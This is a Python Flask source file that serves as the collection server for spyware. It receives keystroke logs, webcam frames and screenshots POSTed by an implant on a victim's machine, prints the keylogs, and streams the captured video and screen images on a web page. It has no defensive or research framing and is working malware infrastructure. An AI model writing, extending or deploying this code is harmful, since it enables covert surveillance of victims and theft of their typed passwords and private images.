from flask import Flask, request, Response, render_template_string
import threading
import time
from cryptography.fernet import Fernet


app = Flask(__name__)
frame_lock = threading.Lock()

#Global variables
CURRENT_FRAME = None
KEYLOG = None
SCREENSHOT = None


# Load the key
# with open('secret.key', 'rb') as key_file:
#     key = key_file.read()
# fernet = Fernet(key)

@app.route('/api/keylog', methods=['POST'])
def keylog():
    global KEYLOG
    KEYLOG = request.form['log']
    print("KEYLOG: " + KEYLOG + "\n")  
    return 'Keylog received', 200

@app.route('/api/webcam', methods=['POST'])
def upload():
    global CURRENT_FRAME
    file = request.files['file']
    CURRENT_FRAME = file.read()
    return 'Frame received', 200

@app.route('/api/screenshot', methods=['POST'])
def screenshot():
    global SCREENSHOT
    file = request.files['file']
    SCREENSHOT = file.read()
    return 'Screenshot received', 200

def gen_frames():
    while True:
        with frame_lock:
            if CURRENT_FRAME is not None:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + CURRENT_FRAME + b'\r\n')
        time.sleep(0.1)  # Adjust the sleep time as needed

@app.route('/video_feed')
def video_feed():
    return Response(gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/screenshot_feed')
def screenshot_feed():
    return Response(SCREENSHOT, mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/')
def index():
    return render_template_string("""
    <html>
    <head>
    <title>Webcam Stream</title>
    </head>
    <body>
    <h1>Webcam Stream</h1>
    <img src="/video_feed">
    <h1>Screenshot</h1>
    <img src="/screenshot_feed">
    </body>
    </html>
    """)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8081, debug=True, threaded=True)

